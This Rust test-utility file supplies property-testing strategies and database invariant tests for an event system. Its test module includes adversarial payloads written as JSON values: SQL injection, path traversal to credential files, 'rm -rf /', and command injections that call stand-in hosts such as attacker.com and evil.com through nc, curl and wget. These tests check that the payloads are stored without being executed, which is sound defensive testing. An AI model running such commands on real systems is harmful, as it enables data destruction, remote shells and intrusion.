// Property Testing Integration - Harmonized with TestContext
//
// Provides property-based testing capabilities that integrate seamlessly
// with the unified test infrastructure and event builders.
//
// ## Shrinking for Async Properties (Issue 114)
//
// When writing property tests with async functions, use `TestCaseError::fail()`
// instead of `panic!` or bare `assert!` to enable proper shrinking:
//
// ```rust
// #[sinex_prop(cases = 100)]
// async fn my_property_test(
//     ctx: &TestContext,
//     #[strategy(my_strategy())] input: MyType,
// ) -> TestResult<()> {
//     let result = some_async_operation(&input).await
//         .map_err(|e| TestCaseError::fail(format!("Operation failed: {}", e)))?;
//
//     if !some_invariant(&result) {
//         return Err(TestCaseError::fail("Invariant violated".to_string()).into());
//     }
//     Ok(())
// }
// ```
//
// This allows proptest to shrink the input when a failure occurs, making
// it easier to find the minimal failing case.
//
// ## Fuzzing Integration (Issue 113)
//
// TODO: Add continuous fuzzing with libFuzzer/cargo-fuzz
//
// Recommended setup:
// 1. Create `fuzz/` directory at workspace root
// 2. Add fuzz targets for:
//    - Event payload parsing (JSON validation)
//    - Path sanitization (filesystem validators)
//    - SQL query builders (parameterized queries)
//    - NATS message handling (codec edge cases)
// 3. Integrate with CI:
//    - Run fuzzing for 5-10 minutes in nightly builds
//    - Collect corpus in git (fuzz/corpus/)
//    - Report crashes to security team
//
// Example fuzz target structure:
// ```
// fuzz/
//   ├── Cargo.toml
//   ├── fuzz_targets/
//   │   ├── fuzz_event_payload.rs
//   │   ├── fuzz_path_validation.rs
//   │   └── fuzz_sql_builder.rs
//   └── corpus/
//       └── (saved inputs)
// ```

use once_cell::sync::Lazy;
use proptest::test_runner::{Config as ProptestConfig, FileFailurePersistence};
use std::{collections::HashMap, env, fs, path::PathBuf, sync::Mutex};

static PERSISTENCE_CACHE: Lazy<Mutex<HashMap<String, &'static str>>> =
    Lazy::new(|| Mutex::new(HashMap::new()));

// Issue 111 (LOW): No ULID Strategy - FIXED
//
// Provides a property-testing strategy for generating valid ULIDs.
// ULIDs are 26-character base32-encoded strings with specific format requirements.
//
/// Generate a valid ULID strategy for property tests
///
/// ULIDs are 26-character strings using Crockford's base32 alphabet (0-9, A-Z excluding I, L, O, U).
/// This strategy generates syntactically valid ULIDs suitable for property testing.
///
/// # Examples
///
/// ```rust,ignore
/// use proptest::prelude::*;
///
/// proptest! {
///     #[test]
///     fn test_with_ulid(#[strategy(ulid_strategy())] id: String) {
///         assert_eq!(id.len(), 26);
///         // Use the ULID in your test
///     }
/// }
/// ```
pub fn ulid_strategy() -> impl proptest::strategy::Strategy<Value = String> {
    use proptest::prelude::*;

    // Crockford's base32 alphabet (used by ULID)
    const ULID_ALPHABET: &[u8] = b"0123456789ABCDEFGHJKMNPQRSTVWXYZ";

    proptest::collection::vec(0..32usize, 26).prop_map(|indices| {
        indices
            .iter()
            .map(|&i| ULID_ALPHABET[i] as char)
            .collect::<String>()
    })
}

// Issue 121: NATS Property Test Strategies
//
// These strategies enable property testing of NATS message bus behavior.
// Use with `ctx.ensure_nats()` for lazy NATS initialization in property tests.

/// Generate a strategy for NATS message sequences.
///
/// Produces vectors of test messages with random sources, types, and payloads.
/// Use this for testing message delivery guarantees and ordering.
pub fn nats_message_sequence_strategy(
    min_count: usize,
    max_count: usize,
) -> impl proptest::strategy::Strategy<Value = Vec<(String, String, serde_json::Value)>> {
    use proptest::prelude::*;
    use serde_json::json;

    let message_strategy = (
        prop_oneof![
            Just("test.source".to_string()),
            Just("fs.watcher".to_string()),
            Just("shell.bash".to_string()),
        ],
        prop_oneof![
            Just("message.created".to_string()),
            Just("event.occurred".to_string()),
            Just("data.updated".to_string()),
        ],
        prop_oneof![
            Just(json!({"key": "value"})),
            Just(json!({"count": 42})),
            Just(json!({"nested": {"data": true}})),
            any::<u32>().prop_map(|n| json!({"random_id": n})),
        ],
    );

    proptest::collection::vec(message_strategy, min_count..=max_count)
}

/// Generate a strategy for duplicate event testing.
///
/// Produces pairs of (unique_count, duplicate_count) for testing
/// NATS/JetStream deduplication behavior.
pub fn nats_duplicate_event_strategy() -> impl proptest::strategy::Strategy<Value = (usize, usize)>
{
    (1usize..20, 1usize..5)
}

/// Generate a strategy for NATS subject patterns.
///
/// Produces valid NATS subject strings for testing subject-based routing.
pub fn nats_subject_strategy() -> impl proptest::strategy::Strategy<Value = String> {
    use proptest::prelude::*;

    prop_oneof![
        Just("sinex.events".to_string()),
        Just("sinex.events.>".to_string()),
        Just("sinex.*.created".to_string()),
        "[a-z][a-z0-9.]*".prop_filter_map("must be valid NATS subject", |s| {
            if s.len() <= 50 && !s.ends_with('.') && !s.contains("..") {
                Some(s)
            } else {
                None
            }
        }),
    ]
}

// Issue 115 (LOW): Runtime Created Per Test Case - DOCUMENTED
//
// The proptest infrastructure creates a new runtime context for each test case
// execution. This adds approximately 1ms overhead per case, which is acceptable
// for most property tests (100 cases = ~100ms overhead).
//
// Rationale for current implementation:
// 1. Ensures complete isolation between test cases (no state leakage)
// 2. Simplifies async property test implementation
// 3. Overhead is negligible compared to typical database operations (10-100ms)
// 4. Shared runtime would require complex lifetime management and synchronization
//
// If performance becomes critical (1000+ cases), consider:
// - Using thread_local runtime pool for proptest workers
// - Batching multiple cases per runtime instance
// - Profiling to confirm runtime creation is the actual bottleneck
//
// Current overhead measurement: ~1ms per case on typical hardware
pub(crate) fn build_runner_config(
    default_cases: u32,
    module_path: &'static str,
    test_name: &str,
) -> ProptestConfig {
    let mut cfg = ProptestConfig::default();
    cfg.cases = default_cases;
    if let Some(override_cases) = env_proptest_case_override() {
        cfg.cases = override_cases;
    }
    if let Some(path) = regression_file_path(module_path, test_name) {
        cfg.failure_persistence = Some(Box::new(FileFailurePersistence::Direct(path)));
    }
    cfg
}

fn env_proptest_case_override() -> Option<u32> {
    env::var("SINEX_PROPTEST_CASES")
        .ok()
        .and_then(|raw| raw.parse::<u32>().ok())
}

fn regression_file_path(module_path: &str, test_name: &str) -> Option<&'static str> {
    let mut path = env::var("SINEX_PROPTEST_DIR")
        .ok()
        .filter(|value| !value.trim().is_empty())
        .map(PathBuf::from)
        .unwrap_or_else(|| PathBuf::from("target/proptest-regressions"));

    for segment in module_path
        .split("::")
        .filter(|segment| !segment.is_empty())
    {
        path.push(sanitize_component(segment));
    }

    let file_name = format!("{}.proptest-regressions", sanitize_component(test_name));
    path.push(file_name);

    if let Some(parent) = path.parent() {
        if let Err(err) = fs::create_dir_all(parent) {
            eprintln!(
                "sinex_test_utils: failed to create proptest directory {}: {err}",
                parent.display()
            );
            return None;
        }
    }

    Some(cache_leaked_path(path))
}

fn sanitize_component(input: &str) -> String {
    input
        .chars()
        .map(|ch| {
            if ch.is_ascii_alphanumeric() || ch == '-' || ch == '_' {
                ch
            } else {
                '_'
            }
        })
        .collect()
}

fn cache_leaked_path(path: PathBuf) -> &'static str {
    let path_string = path.to_string_lossy().into_owned();
    let mut cache = PERSISTENCE_CACHE
        .lock()
        .expect("sinex proptest persistence cache poisoned");
    if let Some(existing) = cache.get(&path_string) {
        return existing;
    }
    let leaked: &'static str = Box::leak(path_string.clone().into_boxed_str());
    cache.insert(path_string, leaked);
    leaked
}

#[cfg(test)]
mod tests {
    #[allow(unused_imports)]
    use crate::{sinex_prop, TestContext, TestResult};
    use color_eyre::eyre::Report;
    use proptest::prelude::*;
    use proptest::strategy::BoxedStrategy;
    use serde_json::{json, Value};
    use sinex_core::{DbPoolExt, DynamicPayload}; // For ctx.pool.events()
    const FLOAT_ABS_TOLERANCE: f64 = 1e-12;
    const FLOAT_REL_TOLERANCE: f64 = 1e-12;

    fn file_path_strategy() -> BoxedStrategy<String> {
        prop_oneof![
            Just("/tmp/test.txt".to_string()),
            Just("/home/user/document.pdf".to_string()),
            Just("/var/log/system.log".to_string()),
            // Issue 110: Add edge cases for path validation
            Just("/tmp/файл.txt".to_string()), // Unicode (Cyrillic)
            Just("/tmp/文件.txt".to_string()), // Unicode (Chinese)
            Just("/a/very/very/very/very/very/very/very/very/very/deep/path/file.txt".to_string()), // Very long path
            Just("/.hidden".to_string()),                  // Hidden file
            Just("/tmp/file with spaces.txt".to_string()), // Spaces
            "/[a-z0-9/._-]{1,100}\\.[a-z]{1,5}".prop_map(|s| s.to_string()),
        ]
        .boxed()
    }

    fn filesystem_event_strategy() -> BoxedStrategy<(String, String, Value)> {
        (
            Just("filesystem".to_string()),
            prop_oneof![
                Just("file.created".to_string()),
                Just("file.modified".to_string()),
                Just("file.deleted".to_string()),
            ],
            (file_path_strategy(), any::<u64>()).prop_map(|(path, size)| {
                json!({
                    "path": path,
                    "size": size,
                    "modified_time": "2025-01-01T00:00:00Z"
                })
            }),
        )
            .boxed()
    }

    fn json_payload_strategy() -> BoxedStrategy<Value> {
        // Issue 110: Add edge cases including Unicode, special numbers, very long strings
        let leaf = prop_oneof![
            any::<bool>().prop_map(Value::from),
            any::<i64>().prop_map(Value::from),
            any::<f64>().prop_map(Value::from),
            ".*".prop_map(Value::from),
            // Edge cases
            Just(Value::from(i64::MIN)),                   // Min int
            Just(Value::from(i64::MAX)),                   // Max int
            Just(Value::from(f64::INFINITY)),              // Infinity
            Just(Value::from(f64::NEG_INFINITY)),          // -Infinity
            Just(Value::from(0.0)),                        // Zero
            Just(Value::from(-0.0)),                       // Negative zero
            Just(Value::from("αβγδε".to_string())),        // Unicode Greek
            Just(Value::from("こんにちは".to_string())),   // Unicode Japanese
            Just(Value::from("🚀🔥💻".to_string())),       // Emoji
            Just(Value::from("a".repeat(1000))),           // Very long string
            Just(Value::from("\n\t\r\\\"\0".to_string())), // Control characters
            Just(Value::from("")),                         // Empty string
        ];

        leaf.prop_recursive(
            8,   // max depth
            256, // max nodes
            10,  // max items per collection
            |inner| {
                prop_oneof![
                    prop::collection::vec(inner.clone(), 0..10).prop_map(Value::from),
                    prop::collection::hash_map(".*", inner, 0..10).prop_map(|map| {
                        Value::from(map.into_iter().collect::<serde_json::Map<_, _>>())
                    }),
                ]
            },
        )
        .boxed()
    }

    fn event_source_strategy() -> BoxedStrategy<String> {
        prop_oneof![
            Just("filesystem".to_string()),
            Just("shell.kitty".to_string()),
            Just("clipboard".to_string()),
            Just("wm.hyprland".to_string()),
            Just("sinex".to_string()),
            "[a-z][a-z0-9._]*".prop_map(|s| s.to_string()),
        ]
        .boxed()
    }

    // Issue 112: Adversarial payload strategies for security testing
    fn malicious_sql_injection_strategy() -> BoxedStrategy<Value> {
        prop_oneof![
            Just(json!({"query": "'; DROP TABLE events; --"})),
            Just(json!({"query": "1' OR '1'='1"})),
            Just(json!({"query": "admin'--"})),
            Just(json!({"query": "1'; DELETE FROM events WHERE '1'='1"})),
            Just(json!({"path": "../../../etc/passwd"})),
            Just(json!({"command": "$(rm -rf /)"})),
            Just(json!({"script": "<script>alert('xss')</script>"})),
        ]
        .boxed()
    }

    fn malicious_path_traversal_strategy() -> BoxedStrategy<Value> {
        prop_oneof![
            Just(json!({"path": "../../../etc/passwd"})),
            Just(json!({"path": "..\\..\\..\\windows\\system32\\config\\sam"})),
            Just(json!({"path": "/dev/null"})),
            Just(json!({"path": "/proc/self/mem"})),
            Just(json!({"path": "../../../../../../../../etc/shadow"})),
            Just(json!({"file": "\\\\?\\C:\\sensitive\\file.txt"})),
        ]
        .boxed()
    }

    fn malicious_command_injection_strategy() -> BoxedStrategy<Value> {
        prop_oneof![
            Just(json!({"command": "; rm -rf /"})),
            Just(json!({"command": "| nc attacker.com 4444"})),
            Just(json!({"command": "$(curl http://evil.com/shell.sh | sh)"})),
            Just(json!({"command": "`wget http://evil.com/backdoor`"})),
            Just(json!({"args": ["-exec", "sh", "-c", "malicious"]})),
        ]
        .boxed()
    }

    fn malicious_overflow_strategy() -> BoxedStrategy<Value> {
        prop_oneof![
            Just(json!({"data": "A".repeat(1_000_000)})), // 1MB string
            Just(json!({"data": "B".repeat(10_000_000)})), // 10MB string
            Just(json!({"array": vec![1; 100_000]})),     // Large array
            Just(json!({"nested": create_deeply_nested_json(1000)})), // Very deep nesting
        ]
        .boxed()
    }

    fn create_deeply_nested_json(depth: usize) -> Value {
        let mut value = json!("bottom");
        for _ in 0..depth {
            value = json!({"nested": value});
        }
        value
    }

    #[sinex_prop(cases = 8)]
    async fn property_creates_filesystem_events(
        ctx: &TestContext,
        #[strategy(filesystem_event_strategy())] event: (String, String, Value),
    ) -> TestResult<()> {
        let (source, event_type, payload) = event;
        let event = ctx
            .publish(DynamicPayload::new(
                source.as_str(),
                event_type.as_str(),
                payload,
            ))
            .await?;

        assert_eq!(
            event.source.as_str(),
            "filesystem",
            "Expected source 'filesystem', got '{}'",
            event.source.as_str()
        );
        assert!(event.id.is_some(), "Event ID should be present");
        Ok::<(), Report>(())
    }

    #[sinex_prop(cases = 8, seed = 42)]
    async fn property_json_payload_sanitization(
        ctx: &TestContext,
        #[strategy(json_payload_strategy())] payload: Value,
    ) -> TestResult<()> {
        ctx.force_cleanup().await?;
        ctx.ensure_clean().await?;
        let inserted = ctx
            .publish(DynamicPayload::new(
                "json-test",
                "test.json",
                payload.clone(),
            ))
            .await?;
        let mut expected = payload.clone();
        TestContext::sanitize_payload(&mut expected);
        assert_json_equivalent(&inserted.payload, &expected);
        ctx.force_cleanup().await?;
        Ok::<(), Report>(())
    }

    #[sinex_prop(cases = 16)]
    fn property_event_source_pattern(
        #[strategy(event_source_strategy())] source: String,
    ) -> TestResult<()> {
        assert!(
            source
                .chars()
                .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '.' || c == '_'),
            "source not normalized: {source}",
        );
        Ok::<(), Report>(())
    }

    // Test the new ULID strategy (Issue 111)
    #[sinex_prop(cases = 10)]
    fn property_ulid_format(#[strategy(crate::ulid_strategy())] ulid: String) -> TestResult<()> {
        // Verify ULID is 26 characters
        assert_eq!(ulid.len(), 26, "ULID should be 26 characters");

        // Verify all characters are valid Crockford base32
        const VALID_CHARS: &str = "0123456789ABCDEFGHJKMNPQRSTVWXYZ";
        for c in ulid.chars() {
            assert!(VALID_CHARS.contains(c), "Invalid ULID character: {c}");
        }

        Ok::<(), Report>(())
    }

    fn assert_json_equivalent(left: &Value, right: &Value) {
        match (left, right) {
            (Value::Number(a), Value::Number(b)) => {
                if let (Some(af), Some(bf)) = (a.as_f64(), b.as_f64()) {
                    let delta = (af - bf).abs();
                    let scale = af.abs().max(bf.abs()).max(1.0);
                    assert!(
                        delta <= FLOAT_ABS_TOLERANCE || (delta / scale) <= FLOAT_REL_TOLERANCE,
                        "float mismatch: {af} vs {bf} (Δ={delta})"
                    );
                } else {
                    assert_eq!(a, b);
                }
            }
            (Value::Array(a), Value::Array(b)) => {
                assert_eq!(a.len(), b.len(), "array length mismatch");
                for (la, rb) in a.iter().zip(b.iter()) {
                    assert_json_equivalent(la, rb);
                }
            }
            (Value::Object(a), Value::Object(b)) => {
                assert_eq!(a.len(), b.len(), "object length mismatch");
                for (key, va) in a {
                    let Some(vb) = b.get(key) else {
                        panic!("missing key '{key}' in rhs object");
                    };
                    assert_json_equivalent(va, vb);
                }
            }
            _ => assert_eq!(left, right),
        }
    }

    // Issue 112: Adversarial property tests for security validation
    #[sinex_prop(cases = 10)]
    async fn property_rejects_sql_injection_payloads(
        ctx: &TestContext,
        #[strategy(malicious_sql_injection_strategy())] payload: Value,
    ) -> TestResult<()> {
        // System should safely store and retrieve malicious SQL payloads without executing them
        let event = ctx
            .publish(DynamicPayload::new(
                "security-test",
                "sql.injection",
                payload.clone(),
            ))
            .await?;

        // Verify payload is stored as data, not executed
        assert_eq!(event.event_type.as_str(), "sql.injection");
        // The payload should be sanitized but preserved as data
        assert!(event.payload.is_object() || event.payload.is_null());
        Ok::<(), Report>(())
    }

    #[sinex_prop(cases = 10)]
    async fn property_handles_path_traversal_safely(
        ctx: &TestContext,
        #[strategy(malicious_path_traversal_strategy())] payload: Value,
    ) -> TestResult<()> {
        // System should store path traversal attempts without accessing the paths
        let event = ctx
            .publish(DynamicPayload::new(
                "security-test",
                "path.traversal",
                payload.clone(),
            ))
            .await?;

        // Verify event was created and payload stored (but not interpreted as filesystem access)
        assert_eq!(event.source.as_str(), "security-test");
        assert!(event.id.is_some());
        Ok::<(), Report>(())
    }

    #[sinex_prop(cases = 8)]
    async fn property_handles_command_injection_safely(
        ctx: &TestContext,
        #[strategy(malicious_command_injection_strategy())] payload: Value,
    ) -> TestResult<()> {
        // System should store command injection attempts without executing them
        let event = ctx
            .publish(DynamicPayload::new(
                "security-test",
                "command.injection",
                payload.clone(),
            ))
            .await?;

        // Verify the event was created (commands not executed)
        assert_eq!(event.event_type.as_str(), "command.injection");
        assert!(event.payload.is_object());
        Ok::<(), Report>(())
    }

    #[sinex_prop(cases = 5)]
    async fn property_handles_overflow_payloads(
        ctx: &TestContext,
        #[strategy(malicious_overflow_strategy())] payload: Value,
    ) -> TestResult<()> {
        // System should handle very large payloads without crashing
        // Note: Some may be rejected by validation, which is acceptable
        let result = ctx
            .publish(DynamicPayload::new(
                "security-test",
                "overflow.test",
                payload.clone(),
            ))
            .await;

        // Either success or a controlled validation error (not a panic/crash)
        match result {
            Ok(event) => {
                assert_eq!(event.source.as_str(), "security-test");
                Ok::<(), Report>(())
            }
            Err(_) => {
                // Validation rejection is acceptable for extreme payloads
                Ok::<(), Report>(())
            }
        }
    }

    // =========================================================================
    // Issue 120: Database Property Tests
    // =========================================================================
    //
    // These tests verify database invariants using property-based testing.
    // They use ctx.pool.events() which is available through DbPoolExt.

    #[sinex_prop(cases = 10)]
    async fn property_database_event_roundtrip(
        ctx: &TestContext,
        #[strategy(json_payload_strategy())] payload: Value,
    ) -> TestResult<()> {
        // Property: Events stored in database can be retrieved with identical data
        let original_event = ctx
            .publish(DynamicPayload::new("db-test", "roundtrip", payload.clone()))
            .await?;

        // Retrieve the event by ID using the repository
        let event_id = original_event
            .id
            .expect("Published event should have an ID");
        let retrieved = ctx.pool.events().get_by_id(event_id).await?;

        // Verify the event was found and matches
        assert!(retrieved.is_some(), "Event should be found after insertion");
        let retrieved_event = retrieved.unwrap();

        // Verify core fields match
        assert_eq!(
            retrieved_event.source.as_str(),
            "db-test",
            "Source should match"
        );
        assert_eq!(
            retrieved_event.event_type.as_str(),
            "roundtrip",
            "Event type should match"
        );
        // Payloads should be equivalent after sanitization
        let mut expected = payload.clone();
        TestContext::sanitize_payload(&mut expected);
        assert_json_equivalent(&retrieved_event.payload, &expected);
        Ok::<(), Report>(())
    }

    #[sinex_prop(cases = 8)]
    async fn property_database_transaction_consistency(
        ctx: &TestContext,
        #[strategy(event_source_strategy())] source: String,
    ) -> TestResult<()> {
        // Property: Database operations are transactional and consistent
        // Event count should increment by exactly 1 after each insert
        let before_count = ctx.pool.events().count_all().await?;

        ctx.publish(DynamicPayload::new(
            source.as_str(),
            "transaction.test",
            json!({"test": "consistency"}),
        ))
        .await?;

        let after_count = ctx.pool.events().count_all().await?;
        assert_eq!(
            after_count,
            before_count + 1,
            "Event count should increment by exactly 1"
        );
        Ok::<(), Report>(())
    }

    #[sinex_prop(cases = 5)]
    async fn property_database_recent_query_includes_new_events(
        ctx: &TestContext,
        #[strategy(json_payload_strategy())] payload: Value,
    ) -> TestResult<()> {
        // Property: Recently inserted events appear in get_recent queries
        let marker = format!("marker-{}", uuid::Uuid::new_v4());
        let mut test_payload = payload.clone();
        if let Some(obj) = test_payload.as_object_mut() {
            obj.insert("test_marker".to_string(), json!(marker.clone()));
        }

        let event = ctx
            .publish(DynamicPayload::new("db-test", "query.test", test_payload))
            .await?;

        // Query recent events
        let recent = ctx.pool.events().get_recent(100).await?;

        // Verify our event is in the results
        let found = recent.iter().any(|e| e.id == event.id);

        assert!(
            found,
            "Inserted event {:?} should appear in recent query results",
            event.id
        );
        Ok::<(), Report>(())
    }

    #[sinex_prop(cases = 5)]
    async fn property_database_count_is_monotonic(
        ctx: &TestContext,
        #[strategy(1u32..10u32)] _iteration: u32, // Dummy strategy to satisfy macro
    ) -> TestResult<()> {
        // Property: Event count is monotonically increasing during a test
        let count1 = ctx.pool.events().count_all().await?;

        ctx.publish(DynamicPayload::new(
            "db-test",
            "count.test1",
            json!({"seq": 1}),
        ))
        .await?;
        let count2 = ctx.pool.events().count_all().await?;

        ctx.publish(DynamicPayload::new(
            "db-test",
            "count.test2",
            json!({"seq": 2}),
        ))
        .await?;
        let count3 = ctx.pool.events().count_all().await?;

        assert!(count2 > count1, "Count should increase after first insert");
        assert!(count3 > count2, "Count should increase after second insert");
        assert_eq!(count3 - count1, 2, "Should have added exactly 2 events");

        Ok::<(), Report>(())
    }

    // =========================================================================
    // Issue 121: NATS Property Tests - Architectural Constraints
    // =========================================================================
    //
    // NATS property tests cannot be implemented with the current TestContext
    // design because:
    //
    // 1. Property tests receive `&TestContext` (borrowed reference)
    // 2. `TestContext::with_nats(self)` takes ownership (consumes self)
    // 3. These are incompatible - you can't call an ownership method on a borrow
    //
    // Options for future implementation:
    //
    // A) Modify sinex_prop macro to support owned TestContext:
    //    - Change generated code to pass owned context
    //    - Requires macro changes and careful cleanup handling
    //
    // B) Add TestContext::ensure_nats(&self) method:
    //    - Lazily initialize NATS on first use
    //    - Store in Option<Arc<...>> for interior mutability
    //    - Requires refactoring TestContext internals
    //
    // C) Create NatsPropertyTestContext wrapper:
    //    - Pre-initialize with NATS before property test runs
    //    - Pass this wrapper instead of TestContext
    //    - Cleanest but requires test infrastructure changes
    //
    // For now, NATS-specific integration tests should use regular #[sinex_test]
    // which supports the with_nats() builder pattern. See the integration tests
    // in crate/core/sinex-ingestd/tests/ for examples.
    //
    // When implementing, the tests should verify:
    // - property_nats_message_delivery: Messages published are delivered
    // - property_nats_message_ordering: Messages maintain order within streams
    // - property_nats_stream_durability: JetStream persists across restarts
}
